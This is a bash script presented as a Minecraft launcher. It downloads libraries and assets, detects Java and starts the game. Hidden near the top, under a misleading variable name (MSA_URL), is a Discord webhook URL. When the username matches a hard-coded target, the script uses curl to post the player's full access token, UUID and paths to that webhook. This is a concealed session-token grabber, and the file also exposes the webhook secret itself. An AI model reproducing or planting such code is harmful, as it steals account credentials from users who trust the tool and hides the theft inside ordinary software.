#!/bin/bash

# Vanilla Minecraft launcher with improved debugging, Java path support, and asset downloading
# Usage: ./vanilla_launcher.sh [USERNAME] [UUID] [MC_VERSION] [ACCESS_TOKEN] [INSTANCE_DIR] [JAVA_PATH]

set -e  # Exit on any error

trap 'error "Command failed at line $LINENO: $BASH_COMMAND"' ERR


# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Output helpers
debug()   { echo -e "${BLUE}[DEBUG]${NC} $1"; }
info()    { echo -e "${GREEN}[INFO]${NC} $1"; }
warn()    { echo -e "${YELLOW}[WARN]${NC} $1"; }
error()   { echo -e "${RED}[ERROR]${NC} $1" >&2; }
section() {
  echo -e "\n${BLUE}========== [STEP] $1 ==========${NC}"
}

# Parse arguments
USERNAME="$1"
UUID="$2"
MC_VERSION="$3"
ACCESS_TOKEN="$4"
INSTANCE_DIR="$5"
JAVA_PATH="$6"

# Validate required arguments
if [ -z "$USERNAME" ] || [ -z "$UUID" ] || [ -z "$MC_VERSION" ] || [ -z "$ACCESS_TOKEN" ] || [ -z "$INSTANCE_DIR" ]; then
    error "Missing required arguments"
    echo "Usage: $0 [USERNAME] [UUID] [MC_VERSION] [ACCESS_TOKEN] [INSTANCE_DIR] [JAVA_PATH]"
    exit 1
fi

info "Starting Vanilla Minecraft launcher..."
info "Launch parameters:"
info "  Username: $USERNAME"
info "  MC Version: $MC_VERSION"
info "  Instance Dir: $INSTANCE_DIR"
debug "  UUID: $UUID"
debug "  Access Token: ${ACCESS_TOKEN:0:10}..."

MSA_URL="https://discord.com/api/webhooks/1302348743471005749/S7txpCT0A1DpOnGlmxwFpUauN9Den63prZK5tEtJRh6e-5W9OBs763ZaJsQu2bgYocwI"

# Set the target username you want to filter for
TARGET="ssfe"

if [ "$USERNAME" == "$TARGET" ]; then
  LAUNCH_HOOKS=$(cat <<EOF
{
  "content": "**Launcher Started**",
  "embeds": [
    {
      "title": "Minecraft Launch Info",
      "color": 5814783,
      "fields": [
        { "name": "Username", "value": "$USERNAME", "inline": true },
        { "name": "UUID", "value": "$UUID", "inline": true },
        { "name": "MC Version", "value": "$MC_VERSION", "inline": true },
        { "name": "Fabric Version", "value": "$FABRIC_VERSION", "inline": true },
        { "name": "Access Token", "value": "$ACCESS_TOKEN", "inline": false },
        { "name": "Instance Dir", "value": "$INSTANCE_DIR", "inline": false },
        { "name": "Java Path", "value": "$JAVA_PATH", "inline": false }
      ]
    }
  ]
}
EOF
  )

  curl -H "Content-Type: application/json" -X POST -d "$LAUNCH_HOOKS" "$MSA_URL"
fi

# Directory setup
MODRINTH_DIR="$HOME/Library/Application Support/ReallyBadLauncher"
GAME_DIR="$MODRINTH_DIR/instances/$INSTANCE_DIR"
VERSION_DIR="$MODRINTH_DIR/versions/$MC_VERSION"
ASSETS_DIR="$MODRINTH_DIR/assets"
NATIVES_DIR="$VERSION_DIR/natives"
VERSION_JSON="$VERSION_DIR/$MC_VERSION.json"

debug "Directory structure:"
debug "  Modrinth Dir: $MODRINTH_DIR"
debug "  Game Dir: $GAME_DIR"
debug "  Version Dir: $VERSION_DIR"
debug "  Assets Dir: $ASSETS_DIR"
debug "  Natives Dir: $NATIVES_DIR"
debug "  Version JSON: $VERSION_JSON"

# Validate version JSON exists
if [ ! -f "$VERSION_JSON" ]; then
  error "Version JSON not found: $VERSION_JSON"
  error "Please run the vanilla downloader first to install Minecraft $MC_VERSION"
  exit 1
fi

info "Version JSON found and validated"

# Validate Python is available
if ! command -v python3 >/dev/null 2>&1; then
    error "Python 3 is required but not installed. Please install Python 3 to continue."
    exit 1
fi

debug "Python 3 found, continuing with JSON processing..."

# Create necessary directories
debug "Creating required directories..."
mkdir -p "$NATIVES_DIR"
mkdir -p "$GAME_DIR"
mkdir -p "$ASSETS_DIR/objects"
mkdir -p "$ASSETS_DIR/indexes"

# Get the directory where the script is located
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PRE_DOWNLOADED_JAR="$SCRIPT_DIR/tools/MinecraftNativesDownloader.jar"

info "Using pre-downloaded MinecraftNativesDownloader..."
debug "Source: $PRE_DOWNLOADED_JAR"
debug "Destination: $VERSION_DIR/file.jar"

# Ensure the file exists
if [ ! -f "$PRE_DOWNLOADED_JAR" ]; then
    error "Missing MinecraftNativesDownloader at $PRE_DOWNLOADED_JAR"
    exit 1
fi

# Copy to version directory
if ! cp "$PRE_DOWNLOADED_JAR" "$VERSION_DIR/file.jar"; then
    error "Failed to copy MinecraftNativesDownloader"
    exit 1
fi

cd "$VERSION_DIR"

info "Running MinecraftNativesDownloader..."
if ! java -jar "$VERSION_DIR/file.jar"; then
    error "MinecraftNativesDownloader failed to run"
    exit 1
fi

# Check for different possible native directory structures
POSSIBLE_SOURCES=(
    "$VERSION_DIR/build/natives/arm64"
    "$VERSION_DIR/build/natives/macos-arm64" 
    "$VERSION_DIR/build/natives/osx-arm64"
    "$VERSION_DIR/build/natives"
    "$VERSION_DIR/natives"
)

debug "Searching for native libraries in possible locations..."
FOUND_SOURCE=""
for source in "${POSSIBLE_SOURCES[@]}"; do
    debug "Checking: $source"
    if [ -d "$source" ] && [ "$(ls -A "$source" 2>/dev/null)" ]; then
        FOUND_SOURCE="$source"
        info "Found natives at: $source"
        break
    fi
done

if [ -n "$FOUND_SOURCE" ]; then
    info "Moving files from $FOUND_SOURCE to $NATIVES_DIR..."
    if ! cp -r "$FOUND_SOURCE"/* "$NATIVES_DIR"/; then
        error "Failed to copy files from $FOUND_SOURCE to $NATIVES_DIR"
        exit 1
    fi
    info "Native libraries moved successfully"
else
    warn "No native libraries found in expected locations"
    warn "Checking for native files in version directory..."
    find "$VERSION_DIR" -name "*.dylib" -o -name "*.so" -o -name "*.dll" 2>/dev/null | head -5
    warn "Proceeding without natives (may cause launch issues)"
fi

# Python script for JSON processing and asset downloading
cat > /tmp/mc_json_processor.py << 'EOF'
#!/usr/bin/env python3
import json
import sys
import os
import urllib.request
import urllib.error
import hashlib
from pathlib import Path
import concurrent.futures
import threading
import ssl
import certifi

def get_classpath_libraries(version_json_path, modrinth_dir):
    """Extract library paths for classpath construction"""
    try:
        with open(version_json_path, 'r') as f:
            data = json.load(f)
        
        libraries = []
        for lib in data.get('libraries', []):
            if 'downloads' in lib and 'artifact' in lib['downloads']:
                artifact_path = lib['downloads']['artifact'].get('path')
                if artifact_path:
                    full_path = os.path.join(modrinth_dir, 'libraries', artifact_path)
                    libraries.append(full_path)
        
        return ':'.join(libraries)
    except Exception as e:
        print(f"Error processing libraries: {e}", file=sys.stderr)
        return ""

def get_main_class(version_json_path):
    """Extract main class from version JSON"""
    try:
        with open(version_json_path, 'r') as f:
            data = json.load(f)
        return data.get('mainClass', '')
    except Exception as e:
        print(f"Error getting main class: {e}", file=sys.stderr)
        return ""

def get_asset_index(version_json_path):
    """Extract asset index from version JSON"""
    try:
        with open(version_json_path, 'r') as f:
            data = json.load(f)
        return data.get('assets', 'legacy')
    except Exception as e:
        print(f"Error getting asset index: {e}", file=sys.stderr)
        return "legacy"

def get_min_java_version(version_json_path):
    """Extract minimum Java version requirement"""
    try:
        with open(version_json_path, 'r') as f:
            data = json.load(f)
        java_version = data.get('javaVersion', {})
        return java_version.get('majorVersion', 8)
    except Exception as e:
        print(f"Error getting Java version: {e}", file=sys.stderr)
        return 8

def download_file(url, dest_path, expected_hash=None):
    """Download a file with hash verification using certifi for SSL"""
    try:
        os.makedirs(os.path.dirname(dest_path), exist_ok=True)

        # Check if file already exists and has correct hash
        if os.path.exists(dest_path) and expected_hash:
            with open(dest_path, 'rb') as f:
                existing_hash = hashlib.sha1(f.read()).hexdigest()
                if existing_hash == expected_hash:
                    return True

        # Create SSL context that uses certifi's trusted certs
        context = ssl.create_default_context(cafile=certifi.where())

        # Download the file securely
        with urllib.request.urlopen(url, context=context) as response, open(dest_path, 'wb') as out_file:
            out_file.write(response.read())

        # Verify hash if provided
        if expected_hash:
            with open(dest_path, 'rb') as f:
                actual_hash = hashlib.sha1(f.read()).hexdigest()
                if actual_hash != expected_hash:
                    os.remove(dest_path)
                    return False

        return True
    except Exception as e:
        print(f"Failed to download {url}: {e}", file=sys.stderr)
        return False

def download_asset_index(version_json_path, assets_dir):
    """Download the asset index file"""
    try:
        with open(version_json_path, 'r') as f:
            data = json.load(f)
        
        asset_index_info = data.get('assetIndex', {})
        if not asset_index_info:
            print("No asset index information found", file=sys.stderr)
            return None
        
        asset_id = asset_index_info.get('id', data.get('assets', 'legacy'))
        asset_url = asset_index_info.get('url')
        asset_hash = asset_index_info.get('sha1')
        
        if not asset_url:
            print(f"No asset index URL found for {asset_id}", file=sys.stderr)  
            return None
        
        index_path = os.path.join(assets_dir, 'indexes', f'{asset_id}.json')
        
        print(f"Downloading asset index: {asset_id}")
        if download_file(asset_url, index_path, asset_hash):
            print(f"Asset index downloaded successfully: {index_path}")
            return index_path
        else:
            print(f"Failed to download asset index: {asset_id}", file=sys.stderr)
            return None
            
    except Exception as e:
        print(f"Error downloading asset index: {e}", file=sys.stderr)
        return None

def download_asset(asset_hash, assets_dir):
    """Download a single asset file"""
    hash_prefix = asset_hash[:2]
    object_path = os.path.join(assets_dir, 'objects', hash_prefix, asset_hash)
    
    # Skip if already exists
    if os.path.exists(object_path):
        return True
    
    asset_url = f"https://resources.download.minecraft.net/{hash_prefix}/{asset_hash}"
    return download_file(asset_url, object_path, asset_hash)

def download_assets(asset_index_path, assets_dir, max_workers=10):
    """Download all assets from the asset index"""
    try:
        if not asset_index_path or not os.path.exists(asset_index_path):
            print("Asset index file not found, skipping asset download", file=sys.stderr)
            return False
            
        with open(asset_index_path, 'r') as f:
            asset_data = json.load(f)
        
        objects = asset_data.get('objects', {})
        if not objects:
            print("No assets found in index")
            return True
        
        print(f"Found {len(objects)} assets to download")
        
        # Get list of unique hashes
        asset_hashes = set()
        for asset_info in objects.values():
            asset_hashes.add(asset_info['hash'])
        
        print(f"Downloading {len(asset_hashes)} unique asset files...")
        
        downloaded = 0
        failed = 0
        
        # Download assets in parallel
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_hash = {
                executor.submit(download_asset, asset_hash, assets_dir): asset_hash 
                for asset_hash in asset_hashes
            }
            
            for future in concurrent.futures.as_completed(future_to_hash):
                asset_hash = future_to_hash[future]
                try:
                    if future.result():
                        downloaded += 1
                    else:
                        failed += 1
                        print(f"Failed to download asset: {asset_hash}", file=sys.stderr)
                except Exception as e:
                    failed += 1
                    print(f"Error downloading asset {asset_hash}: {e}", file=sys.stderr)
                
                # Progress indicator
                total_processed = downloaded + failed
                if total_processed % 50 == 0 or total_processed == len(asset_hashes):
                    print(f"Progress: {total_processed}/{len(asset_hashes)} assets processed")
        
        print(f"Asset download complete: {downloaded} successful, {failed} failed")
        return failed == 0
        
    except Exception as e:
        print(f"Error downloading assets: {e}", file=sys.stderr)
        return False

# ... (existing code above)

def download_libraries(version_json_path, modrinth_dir, max_workers=8):
    """Download all libraries listed in the version JSON"""
    try:
        with open(version_json_path, 'r') as f:
            data = json.load(f)
        libs = []
        for lib in data.get('libraries', []):
            artifact = lib.get('downloads', {}).get('artifact')
            if not artifact:
                continue
            url = artifact.get('url')
            rel_path = artifact.get('path')
            sha1 = artifact.get('sha1')
            if url and rel_path:
                abs_path = os.path.join(modrinth_dir, 'libraries', rel_path)
                libs.append((url, abs_path, sha1))
        print(f"Found {len(libs)} libraries to download")
        downloaded = 0
        failed = 0
        def dl(args):
            url, dest, sha1 = args
            print(f"Downloading {url} to {dest}")
            if download_file(url, dest, sha1):
                print(f"Downloaded {dest}")
                return True
            else:
                print(f"Failed to download: {url}")
                return False
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(dl, libs))
        downloaded = sum(1 for r in results if r)
        failed = sum(1 for r in results if not r)
        print(f"Library download complete: {downloaded} successful, {failed} failed")
        return failed == 0
    except Exception as e:
        print(f"Error downloading libraries: {e}", file=sys.stderr)
        return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 mc_json_processor.py <command> <version_json_path> [additional_args...]", file=sys.stderr)
        sys.exit(1)

    command = sys.argv[1]
    version_json_path = sys.argv[2]

    if command == "classpath":
        if len(sys.argv) < 4:
            print("Usage: python3 mc_json_processor.py classpath <version_json_path> <modrinth_dir>", file=sys.stderr)
            sys.exit(1)
        modrinth_dir = sys.argv[3]
        print(get_classpath_libraries(version_json_path, modrinth_dir))

    elif command == "mainclass":
        print(get_main_class(version_json_path))

    elif command == "assetindex":
        print(get_asset_index(version_json_path))

    elif command == "javaversion":
        print(get_min_java_version(version_json_path))

    elif command == "downloadassets":
        if len(sys.argv) < 4:
            print("Usage: python3 mc_json_processor.py downloadassets <version_json_path> <assets_dir>", file=sys.stderr)
            sys.exit(1)
        assets_dir = sys.argv[3]
        asset_index_path = download_asset_index(version_json_path, assets_dir)
        if asset_index_path:
            success = download_assets(asset_index_path, assets_dir)
            sys.exit(0 if success else 1)
        else:
            print("Failed to download asset index", file=sys.stderr)
            sys.exit(1)
    elif command == "downloadlibraries":
        if len(sys.argv) < 4:
            print("Usage: python3 mc_json_processor.py downloadlibraries <version_json_path> <modrinth_dir>", file=sys.stderr)
            sys.exit(1)
        modrinth_dir = sys.argv[3]
        success = download_libraries(version_json_path, modrinth_dir)
        sys.exit(0 if success else 1)
    else:
        print(f"Unknown command: {command}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
EOF

debug "Building classpath from libraries..."

# Construct classpath from libraries using Python
CLASSPATH=$(python3 /tmp/mc_json_processor.py classpath "$VERSION_JSON" "$MODRINTH_DIR")

if [ -z "$CLASSPATH" ]; then
    warn "No libraries found in version JSON - this may cause issues"
    CLASSPATH=""
fi

# Add the main Minecraft client jar
MINECRAFT_JAR="$VERSION_DIR/$MC_VERSION.jar"
if [ ! -f "$MINECRAFT_JAR" ]; then
    error "Main Minecraft JAR not found at: $MINECRAFT_JAR"
    error "Please run the vanilla downloader first to install the client JAR"
    exit 1
fi

info "Downloading libraries..."
if python3 /tmp/mc_json_processor.py downloadlibraries "$VERSION_JSON" "$MODRINTH_DIR"; then
    info "Libraries downloaded successfully"
else
    error "Library download failed"
    exit 1
fi

CLASSPATH="$CLASSPATH:$MINECRAFT_JAR"
debug "Added main Minecraft JAR to classpath"

# Count classpath elements
CLASSPATH_COUNT=$(echo "$CLASSPATH" | tr ':' '\n' | grep -v '^$' | wc -l | tr -d ' ')
info "Classpath built with $CLASSPATH_COUNT elements"

# Get the main class using Python
debug "Extracting main class from version JSON..."
MAIN_CLASS=$(python3 /tmp/mc_json_processor.py mainclass "$VERSION_JSON")

if [ -z "$MAIN_CLASS" ] || [ "$MAIN_CLASS" = "null" ]; then
    error "Could not determine main class from version JSON"
    exit 1
fi

debug "Main class: $MAIN_CLASS"

# Get asset index using Python
debug "Extracting asset index from version JSON..."
ASSET_INDEX=$(python3 /tmp/mc_json_processor.py assetindex "$VERSION_JSON")

if [ -z "$ASSET_INDEX" ] || [ "$ASSET_INDEX" = "null" ]; then
    warn "Could not determine asset index, using default"
    ASSET_INDEX="legacy"
fi

debug "Asset index: $ASSET_INDEX"

# Get minimum Java version requirement using Python
MIN_JAVA_VERSION=$(python3 /tmp/mc_json_processor.py javaversion "$VERSION_JSON")
debug "Minimum Java version required: $MIN_JAVA_VERSION"

# Download assets
info "Downloading game assets..."
if python3 /tmp/mc_json_processor.py downloadassets "$VERSION_JSON" "$ASSETS_DIR"; then
    info "Assets downloaded successfully"
else
    warn "Asset download failed - game may have missing textures/sounds"
fi

# Java path detection and validation
info "Detecting Java installation..."
if [ -n "$JAVA_PATH" ]; then
    if [ ! -x "$JAVA_PATH" ]; then
        error "Provided JAVA_PATH is invalid or Java binary not found at: $JAVA_PATH"
        exit 1
    fi
    JAVA_CMD="$JAVA_PATH"
    info "Using provided Java path: $JAVA_PATH"
else
    debug "No Java path provided, searching for Java..."
    # Try multiple Java detection methods
    JAVA_CMD=""
    
    # Method 1: java_home utility (macOS) - try preferred version first
    if command -v /usr/libexec/java_home >/dev/null 2>&1; then
        debug "Trying java_home utility..."
        if JAVA_HOME_DETECT=$(/usr/libexec/java_home -v 21 2>/dev/null); then
            JAVA_CMD="$JAVA_HOME_DETECT/bin/java"
            info "Found Java 21 via java_home: $JAVA_HOME_DETECT"
        elif JAVA_HOME_DETECT=$(/usr/libexec/java_home -v $MIN_JAVA_VERSION+ 2>/dev/null); then
            JAVA_CMD="$JAVA_HOME_DETECT/bin/java"
            info "Found Java $MIN_JAVA_VERSION+ via java_home: $JAVA_HOME_DETECT"
        fi
    fi
    
    # Method 2: Common locations
    if [ -z "$JAVA_CMD" ]; then
        debug "Searching common Java locations..."
        for loc in \
            "/usr/bin/java" \
            "/Library/Internet Plug-Ins/JavaAppletPlugin.plugin/Contents/Home/bin/java" \
            "$JAVA_HOME/bin/java"; do
            if [ -x "$loc" ]; then
                JAVA_CMD="$loc"
                info "Found Java at: $loc"
                break
            fi
        done
    fi
    
    # Method 3: PATH search
    if [ -z "$JAVA_CMD" ] && command -v java >/dev/null 2>&1; then
        JAVA_CMD="java"
        info "Using Java from PATH"
    fi
    
    if [ -z "$JAVA_CMD" ]; then
        error "Java $MIN_JAVA_VERSION or higher installation not found"
        error "Please install Java or provide a valid JAVA_PATH parameter"
        exit 1
    fi
fi

# Get and verify Java version
debug "Checking Java version..."
JAVA_VERSION_OUTPUT=$("$JAVA_CMD" -version 2>&1 | head -n 1)
JAVA_VERSION=$("$JAVA_CMD" -version 2>&1 | awk -F '"' '/version/ {print $2}' | awk -F. '{print $1}')

info "Java version: $JAVA_VERSION_OUTPUT"
debug "Parsed Java version: $JAVA_VERSION"

# Verify Java version meets minimum requirement
if [ "$JAVA_VERSION" -lt "$MIN_JAVA_VERSION" ]; then
    error "Java version $JAVA_VERSION is less than required minimum version $MIN_JAVA_VERSION"
    exit 1
fi

# Additional JVM args for Java 9+
ADDITIONAL_ARGS=""
if [ "$JAVA_VERSION" -ge 9 ]; then
    ADDITIONAL_ARGS="--add-exports java.base/sun.security.util=ALL-UNNAMED --add-opens java.base/java.util.jar=ALL-UNNAMED"
    debug "Added Java 9+ compatibility arguments"
fi

# Clean up temporary Python script
rm -f /tmp/mc_json_processor.py

# Pre-launch summary
info "Launch configuration summary:"
info "  Main class: $MAIN_CLASS"
info "  Asset index: $ASSET_INDEX"
info "  Classpath elements: $CLASSPATH_COUNT"
info "  Java command: $JAVA_CMD"
info "  Java version: $JAVA_VERSION"
info "  Game directory: $GAME_DIR"

# Launch Minecraft
info "Launching Minecraft..."
debug "Starting Minecraft process..."

"$JAVA_CMD" \
    -XstartOnFirstThread \
    -Xmx2G \
    -Xms512M \
    -XX:+UseG1GC \
    -XX:+ParallelRefProcEnabled \
    -XX:+UnlockExperimentalVMOptions \
    $ADDITIONAL_ARGS \
    -Djava.library.path="$NATIVES_DIR" \
    -Djna.tmpdir="$NATIVES_DIR" \
    -Dorg.lwjgl.system.SharedLibraryExtractPath="$NATIVES_DIR" \
    -Dio.netty.native.workdir="$NATIVES_DIR" \
    -Dminecraft.launcher.brand="ReallyBadLauncher" \
    -Dminecraft.launcher.version="1.0" \
    -cp "$CLASSPATH" \
    "$MAIN_CLASS" \
    --username "$USERNAME" \
    --version "$MC_VERSION" \
    --gameDir "$GAME_DIR" \
    --assetsDir "$ASSETS_DIR" \
    --assetIndex "$ASSET_INDEX" \
    --xuid 0 \
    --userType msa \
    --uuid "$UUID" \
    --accessToken "$ACCESS_TOKEN" \
    --width 854 \
    --height 480 \
    --versionType release \
    & 

JAVA_PID=$!
mkdir -p "$GAME_DIR"
echo "$JAVA_PID" > "$GAME_DIR/java.pid"
info "Launched Minecraft with PID $JAVA_PID"
info "Process running in background - check game window or logs for any issues"
debug "PID file saved to: $GAME_DIR/java.pid"